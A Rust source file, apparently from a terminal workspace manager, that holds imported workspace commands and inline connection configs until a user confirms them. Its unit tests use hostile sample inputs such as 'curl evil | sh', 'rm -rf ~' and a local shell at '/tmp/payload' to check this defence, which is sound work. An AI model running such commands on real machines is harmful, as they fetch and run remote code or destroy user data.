//! Trust marking for workspaces that come from a file (#4434).
//!
//! A workspace tab can carry an `initialCommand` (typed into the session after
//! it connects) and an `inlineConfig` (an arbitrary connection config, for
//! example a local shell with a custom program, environment or embedded
//! command). When the workspace comes from an import file or a
//! `--workspace-file`, the file alone must not decide what runs on this
//! machine. [`mark_layout_untrusted`] moves every imported command to
//! `pending_initial_command` and flags every inline config, so the frontend
//! holds both until the user confirms them on this machine.
//! [`collect_untrusted_tabs`] lists the flagged tabs for the import notice.

use serde_json::Value;

use super::config::{UntrustedImportedTab, WorkspaceLayoutNode, WorkspaceTabGroupDef};

/// Connection types that only open a connection to another machine or device
/// and do not start a program here. Every other type, including unknown and
/// plugin types, counts as starting a local process.
const NON_SPAWNING_TYPES: &[&str] = &["ssh", "telnet", "serial", "remote-session", "rdp", "vnc"];

/// Mark every tab in `node` as imported and untrusted.
///
/// A non-empty `initial_command` moves to `pending_initial_command` (an empty
/// one is dropped, it would never run anyway). A tab with an `inline_config`
/// gets `inline_config_unconfirmed = true`, whatever the file said.
pub fn mark_layout_untrusted(node: &mut WorkspaceLayoutNode) {
    match node {
        WorkspaceLayoutNode::Leaf { tabs } => {
            for tab in tabs {
                if let Some(cmd) = tab.initial_command.take() {
                    if !cmd.is_empty() {
                        tab.pending_initial_command = Some(cmd);
                    }
                }
                if tab
                    .pending_initial_command
                    .as_deref()
                    .is_some_and(str::is_empty)
                {
                    tab.pending_initial_command = None;
                }
                tab.inline_config_unconfirmed = tab.inline_config.is_some();
            }
        }
        WorkspaceLayoutNode::Split { children, .. } => {
            for child in children {
                mark_layout_untrusted(child);
            }
        }
    }
}

/// Mark every tab of every group as imported and untrusted.
pub fn mark_groups_untrusted(groups: &mut [WorkspaceTabGroupDef]) {
    for group in groups {
        mark_layout_untrusted(&mut group.layout);
    }
}

/// List the tabs of `groups` that wait for confirmation: a pending command, an
/// unconfirmed inline config, or both. Expects groups already passed through
/// [`mark_groups_untrusted`].
pub fn collect_untrusted_tabs(
    workspace_name: &str,
    groups: &[WorkspaceTabGroupDef],
) -> Vec<UntrustedImportedTab> {
    let mut out = Vec::new();
    for group in groups {
        collect_from_layout(workspace_name, &group.layout, &mut out);
    }
    out
}

fn collect_from_layout(
    workspace_name: &str,
    node: &WorkspaceLayoutNode,
    out: &mut Vec<UntrustedImportedTab>,
) {
    match node {
        WorkspaceLayoutNode::Leaf { tabs } => {
            for tab in tabs {
                let inline = tab
                    .inline_config
                    .as_ref()
                    .filter(|_| tab.inline_config_unconfirmed);
                if tab.pending_initial_command.is_none() && inline.is_none() {
                    continue;
                }
                let mut entry = UntrustedImportedTab {
                    workspace_name: workspace_name.to_string(),
                    tab_title: tab.title.clone(),
                    command: tab.pending_initial_command.clone(),
                    ..UntrustedImportedTab::default()
                };
                if let Some(cfg) = inline {
                    describe_inline_config(cfg, &mut entry);
                }
                out.push(entry);
            }
        }
        WorkspaceLayoutNode::Split { children, .. } => {
            for child in children {
                collect_from_layout(workspace_name, child, out);
            }
        }
    }
}

fn non_empty_str<'a>(config: &'a Value, key: &str) -> Option<&'a str> {
    config
        .get(key)
        .and_then(Value::as_str)
        .filter(|s| !s.is_empty())
}

/// Fill the connection fields of `entry` from an inline config
/// (`{ "type": …, "config": { … } }`). Reads only display fields (type, host,
/// user, port, shell, distribution, device, image), never secrets.
fn describe_inline_config(inline: &Value, entry: &mut UntrustedImportedTab) {
    let type_id = inline
        .get("type")
        .and_then(Value::as_str)
        .unwrap_or("")
        .to_string();
    let empty = Value::Null;
    let config = inline.get("config").unwrap_or(&empty);

    let target = match type_id.as_str() {
        "ssh" | "telnet" => non_empty_str(config, "host").map(|host| {
            let mut target = String::new();
            if let Some(user) = non_empty_str(config, "username") {
                target.push_str(user);
                target.push('@');
            }
            target.push_str(host);
            if let Some(port) = config.get("port").and_then(Value::as_u64) {
                target.push_str(&format!(":{port}"));
            }
            target
        }),
        "local" => Some(
            non_empty_str(config, "shell")
                .or_else(|| non_empty_str(config, "shellType"))
                .map(|shell| format!("shell {shell}"))
                .unwrap_or_else(|| "default shell".to_string()),
        ),
        "wsl" => non_empty_str(config, "distribution").map(|d| format!("distribution {d}")),
        "serial" => non_empty_str(config, "port").map(|p| format!("port {p}")),
        "docker" => non_empty_str(config, "image")
            .map(|i| format!("image {i}"))
            .or_else(|| {
                non_empty_str(config, "existingContainer").map(|c| format!("container {c}"))
            }),
        _ => non_empty_str(config, "host").map(str::to_string),
    };

    entry.spawns_local_process = !NON_SPAWNING_TYPES.contains(&type_id.as_str());
    entry.connection_type = Some(if type_id.is_empty() {
        "unknown".to_string()
    } else {
        type_id
    });
    entry.connection_target = target;
    entry.embedded_command = non_empty_str(config, "initialCommand").map(str::to_string);
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::workspace::config::{SplitDirection, WorkspaceTabDef};
    use serde_json::json;

    fn tab(command: Option<&str>, inline: Option<Value>) -> WorkspaceTabDef {
        WorkspaceTabDef {
            connection_ref: None,
            inline_config: inline,
            agent_ref: None,
            title: Some("T".to_string()),
            initial_command: command.map(str::to_string),
            pending_initial_command: None,
            inline_config_unconfirmed: false,
        }
    }

    fn group(layout: WorkspaceLayoutNode) -> WorkspaceTabGroupDef {
        WorkspaceTabGroupDef {
            name: "Main".to_string(),
            color: None,
            layout,
            window_id: None,
        }
    }

    fn leaf_tabs(node: &WorkspaceLayoutNode) -> &[WorkspaceTabDef] {
        match node {
            WorkspaceLayoutNode::Leaf { tabs } => tabs,
            WorkspaceLayoutNode::Split { .. } => panic!("expected leaf"),
        }
    }

    #[test]
    fn marking_moves_command_to_pending_and_flags_inline_config() {
        let mut node = WorkspaceLayoutNode::Leaf {
            tabs: vec![
                tab(Some("curl evil | sh"), None),
                tab(None, Some(json!({"type": "local", "config": {}}))),
                tab(None, None),
            ],
        };
        mark_layout_untrusted(&mut node);
        let tabs = leaf_tabs(&node);
        assert_eq!(tabs[0].initial_command, None);
        assert_eq!(
            tabs[0].pending_initial_command.as_deref(),
            Some("curl evil | sh")
        );
        assert!(!tabs[0].inline_config_unconfirmed);
        assert!(tabs[1].inline_config_unconfirmed);
        assert_eq!(tabs[2], tab(None, None));
    }

    #[test]
    fn marking_drops_empty_commands_and_recurses_into_splits() {
        let mut node = WorkspaceLayoutNode::Split {
            direction: SplitDirection::Horizontal,
            children: vec![
                WorkspaceLayoutNode::Leaf {
                    tabs: vec![tab(Some(""), None)],
                },
                WorkspaceLayoutNode::Leaf {
                    tabs: vec![tab(Some("make"), None)],
                },
            ],
            sizes: None,
        };
        mark_layout_untrusted(&mut node);
        let WorkspaceLayoutNode::Split { children, .. } = &node else {
            panic!("expected split");
        };
        assert_eq!(leaf_tabs(&children[0])[0].initial_command, None);
        assert_eq!(leaf_tabs(&children[0])[0].pending_initial_command, None);
        assert_eq!(
            leaf_tabs(&children[1])[0]
                .pending_initial_command
                .as_deref(),
            Some("make")
        );
    }

    #[test]
    fn marking_ignores_a_file_that_claims_its_inline_config_is_confirmed() {
        // The flag is always re-derived: a file cannot pre-confirm itself.
        let mut t = tab(None, Some(json!({"type": "local", "config": {}})));
        t.inline_config_unconfirmed = false;
        let mut node = WorkspaceLayoutNode::Leaf { tabs: vec![t] };
        mark_layout_untrusted(&mut node);
        assert!(leaf_tabs(&node)[0].inline_config_unconfirmed);
    }

    #[test]
    fn collect_lists_commands_and_describes_inline_configs() {
        let mut groups = vec![group(WorkspaceLayoutNode::Leaf {
            tabs: vec![
                tab(Some("rm -rf ~"), None),
                tab(
                    None,
                    Some(json!({"type": "ssh", "config": {
                        "host": "evil.example", "username": "root", "port": 2222,
                        "password": "hunter2"
                    }})),
                ),
                tab(
                    Some("echo hi"),
                    Some(json!({"type": "local", "config": {
                        "shell": "/tmp/payload", "initialCommand": "id"
                    }})),
                ),
                tab(None, None),
            ],
        })];
        mark_groups_untrusted(&mut groups);
        let list = collect_untrusted_tabs("WS", &groups);
        assert_eq!(list.len(), 3);

        assert_eq!(list[0].workspace_name, "WS");
        assert_eq!(list[0].command.as_deref(), Some("rm -rf ~"));
        assert_eq!(list[0].connection_type, None);

        assert_eq!(list[1].connection_type.as_deref(), Some("ssh"));
        assert_eq!(
            list[1].connection_target.as_deref(),
            Some("root@evil.example:2222")
        );
        assert!(!list[1].spawns_local_process);
        // Never echoes secrets back to the notice.
        assert!(!serde_json::to_string(&list[1]).unwrap().contains("hunter2"));

        assert_eq!(list[2].command.as_deref(), Some("echo hi"));
        assert_eq!(list[2].connection_type.as_deref(), Some("local"));
        assert_eq!(
            list[2].connection_target.as_deref(),
            Some("shell /tmp/payload")
        );
        assert_eq!(list[2].embedded_command.as_deref(), Some("id"));
        assert!(list[2].spawns_local_process);
    }

    #[test]
    fn unknown_and_plugin_types_count_as_spawning_a_local_process() {
        let mut groups = vec![group(WorkspaceLayoutNode::Leaf {
            tabs: vec![tab(
                None,
                Some(json!({"type": "some-plugin", "config": {}})),
            )],
        })];
        mark_groups_untrusted(&mut groups);
        let list = collect_untrusted_tabs("WS", &groups);
        assert!(list[0].spawns_local_process);
        assert_eq!(list[0].connection_type.as_deref(), Some("some-plugin"));
    }
}
